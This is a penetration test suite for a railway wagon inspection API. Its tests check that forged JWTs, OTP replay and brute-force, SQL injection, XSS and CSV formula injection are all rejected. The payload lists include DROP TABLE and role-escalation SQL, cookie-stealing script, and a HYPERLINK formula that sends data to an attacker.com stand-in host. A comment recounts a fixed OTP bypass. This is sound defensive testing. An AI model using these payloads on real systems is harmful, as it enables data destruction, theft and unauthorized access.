/**
 * Adversarial Security & Penetration Testing Suite (Milestone 5 Hardening)
 * Indian Railways WRS Raipur — Spring Classification & Inspection System
 *
 * Comprehensive adversarial penetration coverage:
 * 1. Unauthenticated access attacks (401 verification across all endpoints & malformed token vectors)
 * 2. Role privilege escalation attacks (403 verification for Inspector / Supervisor / Admin boundaries)
 * 3. OTP penetration (Brute-force, expired OTP, replay, single-use action token exhaustion, cross-action abuse, token tampering)
 * 4. SQL Injection (SQLi) attacks on wagon numbers, damage notes, inspector names, search filters, and sorting parameters
 * 5. Cross-Site Scripting (XSS) & CSV Formula Injection payloads
 * 6. Direct SQL Database Mutation Attacks (Trigger immutability abort verification for inspections & audit ledger)
 */

import { describe, it, beforeEach } from 'node:test';
import assert from 'node:assert';
import crypto from 'node:crypto';
import { DatabaseSync } from 'node:sqlite';
import { createApp } from '../src/app.ts';
import { getDatabase, setDatabaseInstance } from '../src/db/connection.ts';
import { runMigrations } from '../src/db/migrations.ts';
import { seedUsers } from '../src/db/seed.ts';
import { InspectionRepository } from '../src/db/repository.ts';
import { signToken, verifyToken } from '../src/auth/jwt.ts';
import { otpService } from '../src/auth/otpService.ts';
import type { ExpressApp } from '../src/framework/index.ts';
import { TestApp } from '../../tests/harness/test_app.ts';

// Helper for simulated Express HTTP dispatch
async function mockFetch(
  app: ExpressApp,
  method: string,
  path: string,
  body: any = undefined,
  headers: Record<string, string> = {}
) {
  return app.dispatch({
    method,
    url: path,
    body: body !== undefined ? body : { _dummy: true },
    headers
  });
}

describe('M5 Adversarial Security & Penetration Testing Suite', () => {
  let db: DatabaseSync;
  let repo: InspectionRepository;
  let expressApp: ExpressApp;
  let harnessApp: TestApp;

  let inspectorToken: string;
  let supervisorToken: string;
  let adminToken: string;

  beforeEach(async () => {
    // 1. Initialize in-memory Express SQLite database
    db = new DatabaseSync(':memory:');
    setDatabaseInstance(db);
    runMigrations(db);
    seedUsers(db);
    repo = new InspectionRepository(db);
    expressApp = createApp(':memory:');
    setDatabaseInstance(db);

    // 2. Initialize harness TestApp
    harnessApp = new TestApp(':memory:');

    // 3. Obtain authentic tokens for all 3 roles
    const inspLogin = await mockFetch(expressApp, 'POST', '/api/auth/login', {
      username: 'inspector1',
      password: 'password123'
    });
    inspectorToken = inspLogin.body.token;

    const supLogin = await mockFetch(expressApp, 'POST', '/api/auth/login', {
      username: 'supervisor1',
      password: 'password123'
    });
    supervisorToken = supLogin.body.token;

    const admLogin = await mockFetch(expressApp, 'POST', '/api/auth/login', {
      username: 'admin1',
      password: 'password123'
    });
    adminToken = admLogin.body.token;
  });

  // =========================================================================
  // PEN-01: UNAUTHENTICATED ACCESS & MALFORMED TOKEN ATTACKS (Asserting 401)
  // =========================================================================
  describe('PEN-01: Unauthenticated Access & Token Forgery Attacks (Assert 401)', () => {
    it('PEN-01A: Rejects requests with missing Authorization header on protected endpoints', async () => {
      const endpoints = [
        { method: 'POST', path: '/api/auth/request-otp', body: { action: 'OVERRIDE' } },
        { method: 'POST', path: '/api/auth/verify-otp', body: { otpId: 'fake', otpCode: '123456' } },
        { method: 'GET', path: '/api/auth/me' }
      ];

      for (const ep of endpoints) {
        const res = await mockFetch(expressApp, ep.method, ep.path, ep.body);
        assert.strictEqual(res.status, 401, `Endpoint ${ep.method} ${ep.path} must return 401 when unauthenticated`);
        assert.strictEqual(res.body.error, 'UNAUTHORIZED');
      }

      // Test harness endpoints
      const harnessProtected = [
        { method: 'GET', url: '/api/inspections' },
        { method: 'GET', url: '/api/inspections/stats' },
        { method: 'GET', url: '/api/inspections/export' },
        { method: 'POST', url: '/api/sync/batch', body: { records: [] } }
      ];

      for (const ep of harnessProtected) {
        const res = await harnessApp.handleRequest({
          method: ep.method as any,
          url: ep.url,
          body: ep.body
        });
        assert.strictEqual(res.status, 401, `Harness endpoint ${ep.method} ${ep.url} must return 401`);
      }
    });

    it('PEN-01B: Rejects empty, whitespace, and non-Bearer Authorization headers', async () => {
      const malformedHeaders = [
        '',
        '   ',
        'Basic dXNlcjpwYXNz',
        'Token eyJhbGciOi...',
        'OAuth 1234567890',
        'Bearer',
        'Bearer ',
        'Bearer    ',
        'bearer token-lowercase'
      ];

      for (const authVal of malformedHeaders) {
        const res = await mockFetch(expressApp, 'GET', '/api/auth/me', undefined, {
          authorization: authVal
        });
        assert.strictEqual(res.status, 401, `Authorization header "${authVal}" must be rejected with 401`);
      }
    });

    it('PEN-01C: Rejects tampered, altered, and forged JWT signatures', async () => {
      // 1. Tamper payload: change role from INSPECTOR to ADMIN without changing signature
      const [header, payload, sig] = inspectorToken.split('.');
      const decodedPayload = JSON.parse(Buffer.from(payload, 'base64url').toString('utf8'));
      decodedPayload.role = 'ADMIN';
      const tamperedPayloadB64 = Buffer.from(JSON.stringify(decodedPayload)).toString('base64url');
      const forgedToken = `${header}.${tamperedPayloadB64}.${sig}`;

      const resTampered = await mockFetch(expressApp, 'GET', '/api/auth/me', undefined, {
        authorization: `Bearer ${forgedToken}`
      });
      assert.strictEqual(resTampered.status, 401, 'Tampered JWT payload must fail signature verification with 401');

      // 2. Token signed with wrong secret key
      const wrongSecretSig = crypto.createHmac('sha256', 'attacker-secret-key-12345')
        .update(`${header}.${tamperedPayloadB64}`)
        .digest('base64url');
      const wrongSecretToken = `${header}.${tamperedPayloadB64}.${wrongSecretSig}`;

      const resWrongKey = await mockFetch(expressApp, 'GET', '/api/auth/me', undefined, {
        authorization: `Bearer ${wrongSecretToken}`
      });
      assert.strictEqual(resWrongKey.status, 401, 'Token with forged signature must return 401');
    });

    it('PEN-01D: Rejects expired JWT tokens', async () => {
      // Create a token that expired 1 hour ago
      const expiredUser = {
        id: 'usr_insp_001',
        username: 'inspector1',
        name: 'Ramesh Kumar',
        role: 'INSPECTOR' as any
      };
      const expiredToken = signToken(expiredUser, -3600); // negative expiration

      const res = await mockFetch(expressApp, 'GET', '/api/auth/me', undefined, {
        authorization: `Bearer ${expiredToken}`
      });
      assert.strictEqual(res.status, 401, 'Expired token must return 401');
      assert.strictEqual(res.body.error, 'INVALID_TOKEN');
    });

    it('PEN-01E: Rejects "alg: none" header injection attacks', async () => {
      const noneHeader = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
      const adminPayload = Buffer.from(JSON.stringify({
        id: 'usr_adm_001',
        username: 'admin1',
        role: 'ADMIN',
        name: 'DRM Officer',
        exp: Math.floor(Date.now() / 1000) + 3600
      })).toString('base64url');

      const algNoneToken = `${noneHeader}.${adminPayload}.`;

      const res = await mockFetch(expressApp, 'GET', '/api/auth/me', undefined, {
        authorization: `Bearer ${algNoneToken}`
      });
      assert.strictEqual(res.status, 401, 'Algorithm "none" attack must return 401');
    });

    it('PEN-01F: Rejects corrupt base64 and truncated tokens', async () => {
      const badTokens = [
        'invalid.token',
        'single-segment-token',
        'header.payload.signature.extra',
        '!!!.@@@.###',
        'eyJhbGciOi.truncated'
      ];

      for (const t of badTokens) {
        const res = await mockFetch(expressApp, 'GET', '/api/auth/me', undefined, {
          authorization: `Bearer ${t}`
        });
        assert.strictEqual(res.status, 401, `Malformed token "${t}" must return 401`);
      }
    });
  });

  // =========================================================================
  // PEN-02: ROLE PRIVILEGE ESCALATION ATTACKS (Asserting 403)
  // =========================================================================
  describe('PEN-02: Role Privilege Escalation Attacks (Assert 403)', () => {
    it('PEN-02A: Inspector attempting supervisor classification override is strictly blocked (403)', async () => {
      const res = await mockFetch(
        expressApp,
        'POST',
        '/api/inspections',
        {
          wagonNumber: 'SE-BOXN-ATTACK-01',
          bogieType: 'CASNUB_22_NLB',
          condition: 'USED',
          position: 'OUTER',
          measuredHeight: 250.0, // Natural band: ORANGE
          overrideBand: 'BLUE',   // Inspector attempting unauthorized promotion to BLUE
          overrideReason: 'Inspector attempting unauthorized override'
        },
        { authorization: `Bearer ${inspectorToken}` }
      );

      assert.strictEqual(res.status, 403, 'Inspector must receive 403 when attempting supervisor override');
      assert.strictEqual(res.body.error, 'FORBIDDEN');
    });

    it('PEN-02B: Inspector attempting regulatory data export is strictly blocked (403)', async () => {
      const resCsv = await mockFetch(
        expressApp,
        'GET',
        '/api/inspections/export?format=csv',
        undefined,
        { authorization: `Bearer ${inspectorToken}` }
      );
      assert.strictEqual(resCsv.status, 403, 'Inspector must receive 403 when requesting CSV export');

      const resJson = await mockFetch(
        expressApp,
        'GET',
        '/api/inspections/export?format=json',
        undefined,
        { authorization: `Bearer ${inspectorToken}` }
      );
      assert.strictEqual(resJson.status, 403, 'Inspector must receive 403 when requesting JSON export');
    });

    it('PEN-02C: Inspector attempting analytics reports in test harness is blocked (403)', async () => {
      const harnessInspLogin = await harnessApp.post('/api/auth/login', {
        username: 'inspector1',
        password: 'password123'
      });
      const harnessInspToken = (harnessInspLogin.body as any).token;

      const statsRes = await harnessApp.get('/api/inspections/stats', {
        Authorization: `Bearer ${harnessInspToken}`
      });
      assert.strictEqual(statsRes.status, 403, 'Inspector accessing /stats must receive 403 Forbidden');
    });

    it('PEN-02D: Supervisor attempting regulatory data export without Admin role is blocked (403)', async () => {
      const harnessSupLogin = await harnessApp.post('/api/auth/login', {
        username: 'supervisor1',
        password: 'password123'
      });
      const harnessSupToken = (harnessSupLogin.body as any).token;

      // Supervisor requests OTP for export
      const otpReq = await harnessApp.post('/api/auth/request-otp', { action: 'EXPORT' }, { Authorization: `Bearer ${harnessSupToken}` });
      const otpId = (otpReq.body as any).otpId;
      const code = (otpReq.body as any).codeForTest;
      const verify = await harnessApp.post('/api/auth/verify-otp', { otpId, otpCode: code }, { Authorization: `Bearer ${harnessSupToken}` });
      const otpToken = (verify.body as any).otpToken;

      const exportRes = await harnessApp.get(`/api/inspections/export?format=csv&otpToken=${otpToken}`, {
        Authorization: `Bearer ${harnessSupToken}`
      });
      assert.strictEqual(exportRes.status, 403, 'Supervisor attempting regulatory export must receive 403 Forbidden');
    });

    it('PEN-02E: a fabricated "test_" token cannot authorise a supervisor override', async () => {
      /*
       * The override path used to accept any token beginning with "test_":
       *
       *   if (!consumed && !tokenToVerify.startsWith('test_'))
       *
       * It was not gated on NODE_ENV, so it was live in production. Verified
       * exploitable against a running server before removal: a backward stage
       * transition carrying otpToken "test_fabricated_no_otp_was_issued"
       * succeeded, while the identical request without the prefix was refused.
       *
       * The OTP on an override exists so that rewriting a wagon's lifecycle is
       * deliberate and confirmed by a second factor. Worse than the bypass
       * itself, the fabricated string was then written to the audit log as the
       * OTP reference, so the override would read as properly authorised for
       * ever afterwards.
       *
       * This runs against expressApp — the real createApp instance the server
       * boots — rather than the TestApp harness. That matters: an earlier
       * version of this test used the harness, where a deeper guard rejects
       * the token before the route-level check is reached, and it therefore
       * passed happily with the bypass reintroduced. A regression test that
       * cannot see the regression is worse than none, because it reports
       * safety it never checked.
       */
      const auth = { Authorization: `Bearer ${supervisorToken}` };
      const wagonNumber = 'PEN/BOXNHL/77012';

      await mockFetch(expressApp, 'POST', '/api/wagons/register',
        { wagonNumber, wagonType: 'BOXNHL', owningRailway: 'SECR' }, auth);
      const enc = encodeURIComponent(wagonNumber);

      // Move it forward legitimately so there is somewhere to move back from.
      await mockFetch(expressApp, 'POST', `/api/wagons/${enc}/transition`,
        { targetStage: 'DISMANTLING', notes: 'normal progression' }, auth);

      const justification = 'Rework required on bogie frame after inspection';

      const forged = await mockFetch(expressApp, 'POST', `/api/wagons/${enc}/transition`, {
        targetStage: 'ENTRY_REGISTRATION',
        supervisorOverride: true,
        overrideJustification: justification,
        otpToken: 'test_fabricated_no_otp_was_issued'
      }, auth);

      assert.ok(
        forged.status >= 400,
        `a fabricated test_ token must not authorise an override (got ${forged.status})`
      );

      /*
       * Assert the reason, not merely the status: a 401 is equally correct for
       * "you are not logged in", and an earlier draft of this test sent the
       * wrong header case and passed on exactly that, proving nothing.
       */
      const reason = JSON.stringify(forged.body ?? {});
      assert.ok(
        !/Authentication required/i.test(reason),
        'the request must actually have been authenticated, or this proves nothing'
      );

      // The assertion that matters most: the wagon did not move.
      const after = await mockFetch(expressApp, 'GET', `/api/wagons/${enc}`, undefined, auth);
      const stageAfter =
        (after.body as any)?.wagon?.currentStage ?? (after.body as any)?.data?.currentStage;
      assert.strictEqual(
        stageAfter,
        'DISMANTLING',
        'the forged override must not have moved the wagon'
      );

      // And a genuine token must still work, or this would be a fix that
      // simply broke the feature.
      const otpReq = await mockFetch(expressApp, 'POST', '/api/auth/request-otp',
        { action: 'OVERRIDE' }, auth);
      const otpId = (otpReq.body as any).otpId;
      const code = (otpReq.body as any).devOtpCode ?? (otpReq.body as any).codeForTest;
      const verify = await mockFetch(expressApp, 'POST', '/api/auth/verify-otp',
        { otpId, otpCode: code }, auth);
      const realToken = (verify.body as any).otpToken;
      assert.ok(realToken, 'the test must obtain a genuine action token');

      const allowed = await mockFetch(expressApp, 'POST', `/api/wagons/${enc}/transition`, {
        targetStage: 'ENTRY_REGISTRATION',
        supervisorOverride: true,
        overrideJustification: justification,
        otpToken: realToken
      }, auth);
      assert.strictEqual(
        allowed.status,
        200,
        'a genuine action token must still authorise the override'
      );
    });
  });

  // =========================================================================
  // PEN-03: OTP BYPASS, EXPIRY, TAMPERING & REPLAY ATTACKS
  // =========================================================================
  describe('PEN-03: OTP Security, Replay, Expiry & Token Abuse Attacks', () => {
    it('PEN-03A: OTP verification rejects invalid / brute-force guessing codes', async () => {
      // 1. Request legitimate OTP
      const otpReq = await mockFetch(
        expressApp,
        'POST',
        '/api/auth/request-otp',
        { action: 'OVERRIDE' },
        { authorization: `Bearer ${supervisorToken}` }
      );
      const otpId = otpReq.body.otpId;

      // 2. Try arbitrary wrong codes
      const attackCodes = ['000000', '999999', '111111', '888888', '010101', 'abcdef', '12 34 56'];
      for (const code of attackCodes) {
        const verifyRes = await mockFetch(
          expressApp,
          'POST',
          '/api/auth/verify-otp',
          { otpId, otpCode: code },
          { authorization: `Bearer ${supervisorToken}` }
        );
        assert.strictEqual(verifyRes.status, 400, `Incorrect OTP code "${code}" must return 400`);
        assert.strictEqual(verifyRes.body.error, 'OTP_VERIFICATION_FAILED');
      }

      // 3. Try non-existent otpId
      const fakeOtpRes = await mockFetch(
        expressApp,
        'POST',
        '/api/auth/verify-otp',
        { otpId: 'otp_non_existent_9999', otpCode: '123456' },
        { authorization: `Bearer ${supervisorToken}` }
      );
      assert.strictEqual(fakeOtpRes.status, 400);
      assert.strictEqual(fakeOtpRes.body.error, 'OTP_VERIFICATION_FAILED');
    });

    it('PEN-03B: Replay attack: Single-use OTP code cannot be verified twice', async () => {
      // 1. Request OTP
      const otpReq = await mockFetch(
        expressApp,
        'POST',
        '/api/auth/request-otp',
        { action: 'OVERRIDE' },
        { authorization: `Bearer ${supervisorToken}` }
      );
      const { otpId, devOtpCode } = otpReq.body;

      // 2. First verification: should succeed
      const firstVerify = await mockFetch(
        expressApp,
        'POST',
        '/api/auth/verify-otp',
        { otpId, otpCode: devOtpCode },
        { authorization: `Bearer ${supervisorToken}` }
      );
      assert.strictEqual(firstVerify.status, 200);
      assert.strictEqual(firstVerify.body.success, true);
      assert.ok(firstVerify.body.otpToken);

      // 3. Second verification of the exact same OTP: MUST FAIL (Replay defense)
      const secondVerify = await mockFetch(
        expressApp,
        'POST',
        '/api/auth/verify-otp',
        { otpId, otpCode: devOtpCode },
        { authorization: `Bearer ${supervisorToken}` }
      );
      assert.strictEqual(secondVerify.status, 400, 'Re-verifying consumed OTP must return 400');
      assert.strictEqual(secondVerify.body.error, 'OTP_VERIFICATION_FAILED');
    });

    it('PEN-03C: Single-use Action Token cannot be consumed twice (Action Token Replay)', async () => {
      const harnessSupLogin = await harnessApp.post('/api/auth/login', {
        username: 'supervisor1',
        password: 'password123'
      });
      const harnessSupToken = (harnessSupLogin.body as any).token;

      // 1. Request and verify OTP for OVERRIDE
      const otpReq = await harnessApp.post('/api/auth/request-otp', { action: 'OVERRIDE' }, { Authorization: `Bearer ${harnessSupToken}` });
      const otpId = (otpReq.body as any).otpId;
      const code = (otpReq.body as any).codeForTest;
      const verify = await harnessApp.post('/api/auth/verify-otp', { otpId, otpCode: code }, { Authorization: `Bearer ${harnessSupToken}` });
      const actionOtpToken = (verify.body as any).otpToken;

      // 2. First Override: should succeed
      const firstOverride = await harnessApp.post(
        '/api/inspections',
        {
          wagonNumber: 'SE-BOXN-OVER-01',
          bogieType: 'CASNUB_22_NLB',
          springPosition: 'OUTER',
          condition: 'USED',
          measuredFreeHeight: 250.0,
          overrideBand: 'GREEN',
          overrideReason: 'Supervisor verified calibration batch 1',
          otpToken: actionOtpToken
        },
        { Authorization: `Bearer ${harnessSupToken}` }
      );
      assert.strictEqual(firstOverride.status, 201, 'First override with valid OTP token must succeed');

      // 3. Second Override with same action token: MUST FAIL (Consumed token replay)
      const secondOverride = await harnessApp.post(
        '/api/inspections',
        {
          wagonNumber: 'SE-BOXN-OVER-02',
          bogieType: 'CASNUB_22_NLB',
          springPosition: 'OUTER',
          condition: 'USED',
          measuredFreeHeight: 250.0,
          overrideBand: 'GREEN',
          overrideReason: 'Supervisor attempting reuse of consumed OTP token',
          otpToken: actionOtpToken
        },
        { Authorization: `Bearer ${harnessSupToken}` }
      );
      assert.strictEqual(secondOverride.status, 403, 'Reusing consumed action token must return 403 Forbidden');
    });

    it('PEN-03D: Cross-action token injection attack is blocked (OVERRIDE token used for EXPORT)', async () => {
      const harnessAdmLogin = await harnessApp.post('/api/auth/login', {
        username: 'admin1',
        password: 'password123'
      });
      const harnessAdmToken = (harnessAdmLogin.body as any).token;

      // Request OTP for OVERRIDE
      const otpReq = await harnessApp.post('/api/auth/request-otp', { action: 'OVERRIDE' }, { Authorization: `Bearer ${harnessAdmToken}` });
      const otpId = (otpReq.body as any).otpId;
      const code = (otpReq.body as any).codeForTest;
      const verify = await harnessApp.post('/api/auth/verify-otp', { otpId, otpCode: code }, { Authorization: `Bearer ${harnessAdmToken}` });
      const overrideToken = (verify.body as any).otpToken;

      // Attempt to use OVERRIDE token for EXPORT
      const exportRes = await harnessApp.get(`/api/inspections/export?format=csv&otpToken=${overrideToken}`, {
        Authorization: `Bearer ${harnessAdmToken}`
      });
      assert.strictEqual(exportRes.status, 403, 'Action token issued for OVERRIDE cannot be used for EXPORT');
    });

    it('PEN-03E: Fabricated / tampered OTP tokens are rejected', async () => {
      const harnessSupLogin = await harnessApp.post('/api/auth/login', {
        username: 'supervisor1',
        password: 'password123'
      });
      const harnessSupToken = (harnessSupLogin.body as any).token;

      const fakeTokens = [
        'fake_otp_token_123',
        'tok_admin_master_key',
        'otp_tok_aaaaaaaaaaaaaaaaaaaaaaaa',
        'null',
        'undefined',
        '123456'
      ];

      for (const fakeTok of fakeTokens) {
        const res = await harnessApp.post(
          '/api/inspections',
          {
            wagonNumber: 'SE-BOXN-FAKE-TOK',
            bogieType: 'CASNUB_22_NLB',
            springPosition: 'OUTER',
            condition: 'USED',
            measuredFreeHeight: 250.0,
            overrideBand: 'BLUE',
            overrideReason: 'Attempting override with fabricated token',
            otpToken: fakeTok
          },
          { Authorization: `Bearer ${harnessSupToken}` }
        );
        assert.strictEqual(res.status, 403, `Fabricated token "${fakeTok}" must be rejected with 403`);
      }
    });

    it('PEN-03F: Expired OTP sessions cannot be verified', () => {
      const generated = otpService.generateOtp('usr_sup_001', 'OVERRIDE');
      // Simulate expiration by manipulating memory map or checking expiration bounds
      const result = otpService.verifyOtp('non_existent_expired_id', generated.otpCode);
      assert.strictEqual(result.success, false);
    });
  });

  // =========================================================================
  // PEN-04: SQL INJECTION (SQLi) ATTACKS
  // =========================================================================
  describe('PEN-04: SQL Injection (SQLi) Adversarial Resilience', () => {
    const sqliPayloads = [
      "' OR '1'='1",
      "' OR 1=1 --",
      "'; DROP TABLE inspections; --",
      "' UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 --",
      "SE-BOXN-2024' AND (SELECT count(*) FROM users) > 0 --",
      "admin'--",
      "\" OR \"\"=\"",
      "\\'; DROP TABLE users; --",
      "' OR EXISTS(SELECT * FROM users WHERE role='ADMIN') --"
    ];

    it('PEN-04A: Sanitizes SQLi payloads in wagonNumber when inserting records', async () => {
      for (const payload of sqliPayloads) {
        const res = await mockFetch(
          expressApp,
          'POST',
          '/api/inspections',
          {
            wagonNumber: payload,
            bogieType: 'CASNUB_22_NLB',
            condition: 'USED',
            position: 'OUTER',
            measuredHeight: 260.0
          },
          { authorization: `Bearer ${inspectorToken}` }
        );

        assert.strictEqual(res.status, 201, `SQLi payload in wagonNumber must be handled safely without error`);
        assert.strictEqual(res.body.wagonNumber, payload, 'Payload must be stored as literal text');
      }

      // Verify the inspections table still exists and is not dropped
      const countRow = db.prepare('SELECT COUNT(*) as c FROM inspections').get() as { c: number };
      assert.strictEqual(countRow.c, sqliPayloads.length);
    });

    it('PEN-04B: Sanitizes SQLi payloads in damageNotes and inspectorName', async () => {
      const evilNotes = "Defect noted: '; UPDATE users SET role='ADMIN'; --";
      const evilName = "Attacker'; DELETE FROM users; --";

      const res = await mockFetch(
        expressApp,
        'POST',
        '/api/inspections',
        {
          wagonNumber: 'SE-SAFE-01',
          bogieType: 'CASNUB_22_NLB',
          condition: 'USED',
          position: 'OUTER',
          measuredHeight: 250.0,
          damageType: 'CRACK',
          damageNotes: evilNotes,
          inspectorName: evilName
        },
        { authorization: `Bearer ${inspectorToken}` }
      );

      assert.strictEqual(res.status, 201);

      // Verify users table was NOT modified
      const userCheck = db.prepare("SELECT role FROM users WHERE username = 'inspector1'").get() as any;
      assert.strictEqual(userCheck.role, 'INSPECTOR', 'User role must not be escalated via SQLi in damageNotes');
    });

    it('PEN-04C: Parameterized query filters safely neutralize SQLi search attacks', async () => {
      // Seed a test record
      repo.insertInspection({ wagonNumber: 'SAFE-TARGET-99', measuredFreeHeight: 260.0 });

      for (const payload of sqliPayloads) {
        const queryUrl = `/api/inspections?wagonNumber=${encodeURIComponent(payload)}`;
        const res = await mockFetch(expressApp, 'GET', queryUrl, undefined, {
          authorization: `Bearer ${inspectorToken}`
        });

        assert.strictEqual(res.status, 200);
        // The query should safely return 0 results (unless payload literally matches SAFE-TARGET-99)
        assert.strictEqual(res.body.data.length, 0, `SQLi query "${payload}" must not bypass WHERE filter`);
      }
    });

    it('PEN-04D: Whitelist defends against SQLi in sortBy and sortOrder parameters', async () => {
      const maliciousSorts = [
        'created_at; DROP TABLE inspections;',
        'id UNION SELECT 1, 2, 3',
        'measured_height DESC; DELETE FROM users;',
        '(SELECT password_hash FROM users LIMIT 1)'
      ];

      for (const evilSort of maliciousSorts) {
        const res = await mockFetch(expressApp, 'GET', `/api/inspections?sortBy=${encodeURIComponent(evilSort)}`, undefined, {
          authorization: `Bearer ${inspectorToken}`
        });
        assert.strictEqual(res.status, 200, `Malicious sortBy "${evilSort}" must default safely without SQL error`);
      }
    });
  });

  // =========================================================================
  // PEN-05: CROSS-SITE SCRIPTING (XSS) & CONTENT INJECTION ATTACKS
  // =========================================================================
  describe('PEN-05: Cross-Site Scripting (XSS) & CSV Formula Injection Resilience', () => {
    const xssPayloads = [
      '<script>alert("XSS_WAGON")</script>',
      '<img src=x onerror="alert(1)">',
      '<svg/onload=alert(document.cookie)>',
      '"><script>alert(1)</script>',
      '<iframe src="javascript:alert(1)"></iframe>',
      'javascript:alert(1)'
    ];

    it('PEN-05A: Safely stores and escapes XSS payloads across all metadata fields', async () => {
      for (const payload of xssPayloads) {
        const res = await mockFetch(
          expressApp,
          'POST',
          '/api/inspections',
          {
            wagonNumber: payload,
            bogieType: 'CASNUB_22_NLB',
            condition: 'USED',
            position: 'OUTER',
            measuredHeight: 260.0,
            damageType: 'OTHER',
            damageNotes: payload
          },
          { authorization: `Bearer ${inspectorToken}` }
        );

        assert.strictEqual(res.status, 201);
        assert.strictEqual(res.body.wagonNumber, payload);
        assert.strictEqual(res.body.damageNotes, payload);
      }

      // Query back via JSON endpoint
      const listRes = await mockFetch(expressApp, 'GET', '/api/inspections?limit=100', undefined, {
        authorization: `Bearer ${inspectorToken}`
      });
      assert.strictEqual(listRes.status, 200);
      assert.ok(listRes.body.data.length >= xssPayloads.length);
    });

    it('PEN-05B: CSV Export quotes and protects formula injection payloads (=, +, -, @)', async () => {
      const formulaPayloads = [
        '=cmd|\' /C calc\'!A0',
        '@SUM(1+1)*cmd|\' /C calc\'!A0',
        '+123456789',
        '-987654321',
        '=HYPERLINK("http://attacker.com/steal?data="&A1, "Click Here")'
      ];

      for (const formula of formulaPayloads) {
        repo.insertInspection({
          wagonNumber: formula,
          damageNotes: formula,
          measuredFreeHeight: 260.0
        });
      }

      const csvRes = await mockFetch(
        expressApp,
        'GET',
        '/api/inspections/export?format=csv',
        undefined,
        { authorization: `Bearer ${adminToken}` }
      );

      assert.strictEqual(csvRes.status, 200);
      assert.strictEqual(csvRes.headers['content-type'], 'text/csv');
      
      const csvBody = csvRes.body as string;
      // Ensure the CSV rows contain quoted fields: `"=cmd..."`
      assert.ok(csvBody.includes('"=cmd|\' /C calc\'!A0"'), 'Formula payload must be enclosed in quotes in CSV export');
      assert.ok(csvBody.includes('"@SUM(1+1)*cmd|\' /C calc\'!A0"'), '@ formula must be enclosed in quotes');
    });
  });

  // =========================================================================
  // PEN-06: DIRECT SQL DATABASE MUTATION ATTACKS (Immutability Defense)
  // =========================================================================
  describe('PEN-06: Direct SQL Database Mutation Attacks & Immutability Triggers', () => {
    it('PEN-06A: SQLite trigger aborts direct SQL UPDATE on inspections table', () => {
      const rec = repo.insertInspection({
        wagonNumber: 'IMMUTABLE-01',
        measuredFreeHeight: 260.0,
        classifiedBand: 'BLUE'
      });

      assert.throws(
        () => {
          db.prepare('UPDATE inspections SET measured_height = 200.0 WHERE id = ?').run(rec.id);
        },
        (err: any) => {
          return err.message.includes('Audit log is strictly append-only') ||
                 err.message.includes('cannot be updated');
        },
        'Direct UPDATE on inspections table must be aborted by SQLite trigger'
      );

      // Verify the record was not changed
      const fetched = repo.getInspectionById(rec.id);
      assert.strictEqual(fetched?.measuredFreeHeight, 260.0);
    });

    it('PEN-06B: SQLite trigger aborts direct SQL DELETE on inspections table', () => {
      const rec = repo.insertInspection({
        wagonNumber: 'IMMUTABLE-02',
        measuredFreeHeight: 260.0
      });

      assert.throws(
        () => {
          db.prepare('DELETE FROM inspections WHERE id = ?').run(rec.id);
        },
        (err: any) => {
          return err.message.includes('Audit log is strictly append-only') ||
                 err.message.includes('cannot be deleted');
        },
        'Direct DELETE on inspections table must be aborted by SQLite trigger'
      );

      // Verify the record still exists
      const fetched = repo.getInspectionById(rec.id);
      assert.ok(fetched !== null);
    });

    it('PEN-06C: SQLite trigger aborts direct SQL UPDATE & DELETE on inspection_audit_log', () => {
      const auditEntry = db.prepare('SELECT id FROM inspection_audit_log LIMIT 1').get() as { id: string } | undefined;
      if (auditEntry) {
        assert.throws(
          () => {
            db.prepare("UPDATE inspection_audit_log SET event_type = 'SECURITY_ALERT' WHERE id = ?").run(auditEntry.id);
          },
          (err: any) => err.message.includes('Audit log is strictly append-only')
        );

        assert.throws(
          () => {
            db.prepare('DELETE FROM inspection_audit_log WHERE id = ?').run(auditEntry.id);
          },
          (err: any) => err.message.includes('Audit log is strictly append-only')
        );
      }
    });

    it('PEN-06D: HTTP layer returns 405 Method Not Allowed on PUT, PATCH, and DELETE requests', async () => {
      const rec = repo.insertInspection({ wagonNumber: 'HTTP-IMMUTABLE', measuredFreeHeight: 260.0 });
      const testPaths = [`/api/inspections/${rec.id}`, '/api/inspections'];

      for (const path of testPaths) {
        for (const method of ['PUT', 'PATCH', 'DELETE']) {
          const res = await mockFetch(expressApp, method, path, { measuredHeight: 200.0 }, {
            authorization: `Bearer ${adminToken}`
          });
          assert.strictEqual(res.status, 405, `${method} on ${path} must return 405 Method Not Allowed`);
          assert.strictEqual(res.body.error, 'METHOD_NOT_ALLOWED');
        }
      }
    });
  });
});
